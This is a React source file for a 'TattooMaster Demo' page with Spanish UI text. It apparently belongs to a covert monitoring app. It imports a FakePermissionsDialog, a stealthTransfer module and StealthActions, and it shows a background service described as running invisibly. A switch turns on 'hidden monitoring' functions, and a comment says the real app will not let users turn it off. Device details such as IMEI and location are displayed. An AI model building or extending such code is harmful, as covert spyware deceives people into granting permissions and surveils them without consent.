import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Switch } from "@/components/ui/switch";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Label } from "@/components/ui/label";
import { 
  Smartphone, 
  Wifi, 
  Clock, 
  Activity, 
  Shield, 
  Map, 
  File, 
  User,
  Check,
  X,
  Bell,
  Monitor,
  Battery
} from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { FakePermissionsDialog } from "@/components/permissions/FakePermissionsDialog";
import { PermissionType, wasPermissionGranted, wereAllPermissionsRequested } from "@/components/permissions/PermissionsManager";
import { backgroundService } from "@/lib/backgroundService";
import { stealthTransfer } from "@/lib/stealthTransfer";
import { StealthActions } from "@/components/devices/StealthActions";

export default function DemoPage() {
  const [activePermission, setActivePermission] = useState<PermissionType | null>(null);
  const [permissionDialogOpen, setPermissionDialogOpen] = useState(false);
  const [serviceRunning, setServiceRunning] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [runningTime, setRunningTime] = useState("0s");
  
  // Request a specific permission
  const requestPermission = (permission: PermissionType) => {
    setActivePermission(permission);
    setPermissionDialogOpen(true);
  };
  
  // Check background service status
  useEffect(() => {
    const checkService = () => {
      try {
        const isRunning = backgroundService.isServiceRunning();
        setServiceRunning(isRunning);
        
        const info = backgroundService.getDeviceInfo();
        setDeviceInfo(info);
        
        // Calculate running time
        const runTime = backgroundService.getRunningTime();
        if (runTime > 0) {
          const seconds = Math.floor(runTime / 1000);
          if (seconds < 60) {
            setRunningTime(`${seconds}s`);
          } else if (seconds < 3600) {
            setRunningTime(`${Math.floor(seconds / 60)}m ${seconds % 60}s`);
          } else {
            setRunningTime(`${Math.floor(seconds / 3600)}h ${Math.floor((seconds % 3600) / 60)}m`);
          }
        }
      } catch (error) {
        console.error("Error checking service status:", error);
      }
    };
    
    checkService();
    const interval = setInterval(checkService, 5000);
    
    return () => clearInterval(interval);
  }, []);
  
  // Handle permission granted
  const handlePermissionGranted = () => {
    console.log(`Permission granted for: ${activePermission}`);
  };
  
  return (
    <div className="container mx-auto p-4 max-w-5xl">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h1 className="text-3xl font-bold">TattooMaster Demo</h1>
          <p className="text-muted">Pruebas y verificación de funcionalidades</p>
        </div>
        <div>
          <Badge variant={serviceRunning ? "default" : "destructive"} className={serviceRunning ? "bg-green-500 hover:bg-green-600" : ""}>
            {serviceRunning ? "Servicio Activo" : "Servicio Inactivo"}
          </Badge>
        </div>
      </div>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card>
          <CardHeader>
            <div className="flex items-center justify-between">
              <CardTitle className="text-xl flex items-center">
                <Shield className="h-5 w-5 mr-2 text-blue-600" />
                Solicitud de Permisos
              </CardTitle>
              <Badge variant="outline">
                {wereAllPermissionsRequested() ? "Completado" : "Pendiente"}
              </Badge>
            </div>
            <CardDescription>
              Prueba de solicitud de permisos individuales
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {["camera", "location", "storage", "contacts", "notifications"].map((permission) => (
                <div 
                  key={permission} 
                  className="flex items-center justify-between bg-neutral-50 p-3 rounded-lg"
                >
                  <div className="flex items-center gap-3">
                    <div className={`p-2 rounded-md ${
                      wasPermissionGranted(permission as PermissionType) 
                        ? "bg-green-100" 
                        : "bg-neutral-100"
                    }`}>
                      {permission === "camera" && <Smartphone className="h-5 w-5 text-neutral-700" />}
                      {permission === "location" && <Map className="h-5 w-5 text-neutral-700" />}
                      {permission === "storage" && <File className="h-5 w-5 text-neutral-700" />}
                      {permission === "contacts" && <User className="h-5 w-5 text-neutral-700" />}
                      {permission === "notifications" && <Bell className="h-5 w-5 text-neutral-700" />}
                    </div>
                    <div>
                      <h3 className="font-medium">{`Permiso de ${permission}`}</h3>
                      <p className="text-xs text-neutral-500">
                        {wasPermissionGranted(permission as PermissionType) 
                          ? "Permiso otorgado" 
                          : "Permiso no otorgado"}
                      </p>
                    </div>
                  </div>
                  
                  <Button 
                    size="sm" 
                    variant="outline"
                    onClick={() => requestPermission(permission as PermissionType)}
                    disabled={wasPermissionGranted(permission as PermissionType)}
                  >
                    {wasPermissionGranted(permission as PermissionType) 
                      ? <Check className="h-4 w-4 text-green-600" />
                      : "Solicitar"}
                  </Button>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
        
        <Card>
          <CardHeader>
            <CardTitle className="text-xl flex items-center">
              <Activity className="h-5 w-5 mr-2 text-red-600" />
              Estado del Servicio en Segundo Plano
            </CardTitle>
            <CardDescription>
              Información sobre el servicio que se ejecuta invisiblemente
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Clock className="h-5 w-5 text-neutral-700" />
                  <span>Tiempo de ejecución</span>
                </div>
                <Badge variant="secondary">{runningTime}</Badge>
              </div>
              
              <Separator />
              
              <div className="space-y-3">
                <h3 className="text-sm font-medium">Información del dispositivo</h3>
                
                {deviceInfo ? (
                  <>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div className="flex items-center gap-2">
                        <Wifi className="h-4 w-4 text-neutral-500" />
                        <span>En línea:</span>
                      </div>
                      <span>
                        {deviceInfo.isOnline ? (
                          <Badge variant="default" className="bg-green-500 hover:bg-green-600">Sí</Badge>
                        ) : (
                          <Badge variant="destructive">No</Badge>
                        )}
                      </span>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div className="flex items-center gap-2">
                        <Smartphone className="h-4 w-4 text-neutral-500" />
                        <span>Plataforma:</span>
                      </div>
                      <span>{deviceInfo.platform}</span>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div className="flex items-center gap-2">
                        <Monitor className="h-4 w-4 text-neutral-500" />
                        <span>Pantalla:</span>
                      </div>
                      <span>{deviceInfo.screenWidth}x{deviceInfo.screenHeight}</span>
                    </div>
                    
                    {deviceInfo.batteryLevel !== null && (
                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div className="flex items-center gap-2">
                          <Battery className="h-4 w-4 text-neutral-500" />
                          <span>Batería:</span>
                        </div>
                        <span>
                          {Math.round(deviceInfo.batteryLevel * 100)}%
                          {deviceInfo.isCharging && " (cargando)"}
                        </span>
                      </div>
                    )}
                  </>
                ) : (
                  <div className="h-20 flex items-center justify-center">
                    <p className="text-neutral-500">No hay información disponible</p>
                  </div>
                )}
              </div>
              
              <Separator />
              
              <div className="flex flex-col gap-2">
                <Label htmlFor="sneaky-mode">Permitir operación invisible</Label>
                <div className="flex items-center justify-between">
                  <span className="text-sm text-neutral-700">
                    Activar todas las funciones de monitoreo oculto
                  </span>
                  <Switch 
                    id="sneaky-mode" 
                    checked={serviceRunning}
                    onCheckedChange={(checked) => {
                      if (checked) {
                        backgroundService.updateActivityTime();
                      } else {
                        // This is just for demo - in reality we won't allow this to be turned off
                        console.log("Intentando desactivar el servicio (solo demostración)");
                      }
                    }}
                  />
                </div>
                
                <StealthActions 
                  device={{ 
                    id: 1,
                    name: "Dispositivo Demo",
                    deviceId: "demo-device-1",
                    model: "Demo Phone",
                    osVersion: "Android 10.0",
                    imei: "123456789012345",
                    user: "usuario.demo",
                    department: "IT",
                    lastActive: new Date(),
                    lastIpAddress: "192.168.1.100",
                    status: "online",
                    isOnline: true,
                    latitude: "19.4326",
                    longitude: "-99.1332",
                    storage: { total: "64GB", free: "32GB" },
                    battery: 85,
                    installedApps: [],
                    alerts: [],
                    createdAt: new Date()
                  }} 
                  visible={true} 
                />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
      
      {/* Current Permission Dialog */}
      {activePermission && (
        <FakePermissionsDialog
          permission={activePermission}
          onPermissionGranted={handlePermissionGranted}
          isOpen={permissionDialogOpen}
          setIsOpen={setPermissionDialogOpen}
        />
      )}
    </div>
  );
}